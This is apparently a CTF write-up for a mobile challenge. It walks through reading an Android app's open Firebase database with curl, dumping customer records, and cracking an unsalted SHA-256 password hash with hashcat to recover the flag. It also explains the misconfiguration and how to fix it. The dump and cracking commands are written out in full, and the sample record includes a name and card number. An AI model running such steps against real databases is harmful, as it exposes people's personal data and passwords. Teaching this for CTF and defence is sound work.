---
id: "friendly-ctf-wideopen"
title: "WideOpen"
category: "CTF Writeups"
date: "2026-09-27"
summary: "The Firebase database has its read rule left open, so the whole customer table dumps over REST and one password hash in it is crackable."
flag: "Securinets{azerty123}"
tags:
  - "Mobile Security"
  - "Web Security"
---

This screen is a sign-in / sign-up form for a "Connect" account, and the moment you open it, it quietly pulls some config from a cloud database. The hint at the bottom of the screen is the whole challenge in one line: append `.json` to any path in a Firebase database to read it over REST, and start at the root. You are not attacking the app so much as knocking on the database directly and finding out it never locked the door.

The flag is a password. Somewhere in that database is a person you have been asked about, their password is stored as a hash, and that hash is weak enough to crack. Recover the password and you have the flag.

## What you're looking at

The app uses Firebase Realtime Database. That is a hosted JSON tree, and every node in it can be read over plain HTTP by appending `.json` to its path — that is Firebase's own REST API, not a trick. Whether an outsider is allowed to do that is entirely down to the database's security rules. If the read rule is `true`, the whole tree is public.

Open the APK in jadx and the config class spells out the database URL:

```kotlin
private const val BASE_URL =
    "https://securinetsfriendlydatabase-default-rtdb.europe-west1.firebasedatabase.app"

val FIREBASE_REST_URL = "$BASE_URL/.json"
```

That is all you need. `curl` and something to crack a hash (an online lookup like CrackStation, or `hashcat` with `rockyou.txt`) round out the toolkit. No emulator, no proxy.

## Finding the way in

Start at the root, the way the screen tells you to:

```bash
curl "https://securinetsfriendlydatabase-default-rtdb.europe-west1.firebasedatabase.app/.json"
```

If the rules were set correctly you would get `{"error":"Permission denied"}`. Instead the entire tree comes back. Pretty-print it and you can see the structure: an `app_config` node, some `feature_flags`, and a big `customers` node with a couple of thousand records in it.

```json
{
  "customers": {
    "0001": {
      "first_name": "Aziz",
      "last_name": "Rahmouni",
      "phone": "+216 ...",
      "credit_card": "4000-0566-5566-5556",
      "password_hash": "sha256:f3029a66c61b61b41b428963a2fc134154a5383096c776f3b4064733c5463d90"
    },
    "0002": { ... }
  }
}
```

Two thousand records is a lot to eyeball, so pull just the customers and let a tool do the reading:

```bash
curl "https://securinetsfriendlydatabase-default-rtdb.europe-west1.firebasedatabase.app/customers.json" -o customers.json
```

Every record has a `password_hash` field. Most of them are `sha256:` over random junk that no wordlist will ever crack. The trick is that exactly one of the two thousand is a real, human password, the account you were asked about — so if you throw a cracker at all of them you get precisely one hit, and it is the right one.

## The solve

The hashes are unsalted SHA-256, which is the easiest kind to reverse because online services keep giant lookup tables of them. Pull the hashes out and try them.

The target record is the named one near the top of the table. Take its `password_hash`, drop the `sha256:` prefix, and look it up:

```bash
jq -r '.["0001"].password_hash' customers.json
# sha256:f3029a66c61b61b41b428963a2fc134154a5383096c776f3b4064733c5463d90
```

Paste the hex into CrackStation, or run it locally:

```bash
echo 'f3029a66c61b61b41b428963a2fc134154a5383096c776f3b4064733c5463d90' > hash.txt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

It falls in seconds:

```
f3029a66c61b61b41b428963a2fc134154a5383096c776f3b4064733c5463d90:azerty123
```

The password is `azerty123`, and the flag is that wrapped in the format: `Securinets{azerty123}`. AZERTY is the keyboard layout used in Tunisia, so `azerty123` is a keyboard-walk password a real person would actually pick, which is exactly why it cracks instantly.

Source for this one is in `Writeups/Securinets-Friendly-CTF-2026/mobile/app`.

## Why it works

This is the M8 security-misconfiguration lesson, and it is the most realistic bug in the whole set. Firebase, like most backend-as-a-service platforms, does its access control in a rules file, not in the app. The default posture during development is often wide open so the developer can move fast, and the single most common Firebase incident in the wild is shipping to production with those dev rules still in place. Nobody wrote insecure code. They just never wrote the rule that says "outsiders cannot read this", and the platform's default filled the gap the wrong way.

The thing to internalise is that the mobile client is not the access control. It does not matter that the app only ever reads your own record through a nice login flow — the database is reachable directly, over REST, by anyone with the URL, and the URL is sitting in the APK. Access has to be enforced where the data lives. On top of that, the passwords are stored as unsalted SHA-256, which is barely better than plaintext for common passwords, because unsalted fast hashes are exactly what those online lookup tables defeat. Real storage needs a slow, salted hash like bcrypt or Argon2.

## Notes from building it

I seeded two thousand records so the table cannot be skimmed, and I made every hash except one uncrackable on purpose, they are SHA-256 over 256 bits of randomness, which no wordlist will ever touch. That means a player who dumps everything and runs hashcat over the lot gets a single hit, and it is the person the challenge asked about, not a false lead. The names at the front of the list are real people I know, which is a small in-joke, and it makes the "you were asked about a specific person" framing land instead of feeling like a randomly generated haystack.

## Beyond the challenge

Imagine a mobile app hiding its customer directory behind a login screen while its Firebase rules allow unauthenticated database reads. A request made outside the app can then bypass the screen entirely. The database rules, not the presence of a login page, decide who can read the records.

Test unauthenticated access and access between users against narrowly scoped records. Use [Firebase security rules](https://firebase.google.com/docs/database/security) to enforce the intended permissions, and test those rules before deployment. A Firebase project identifier or API key in an app is not, by itself, proof that the database is exposed.

## Keep learning

- [Hextree](https://www.hextree.io/courses): continue with Android security courses and hands-on exercises.
- [Firebase Realtime Database security rules](https://firebase.google.com/docs/database/security): learn how authentication and read/write rules control access.
- [OWASP Mobile Application Security Testing Guide](https://mas.owasp.org/MASTG/): continue with mobile backend and storage testing.
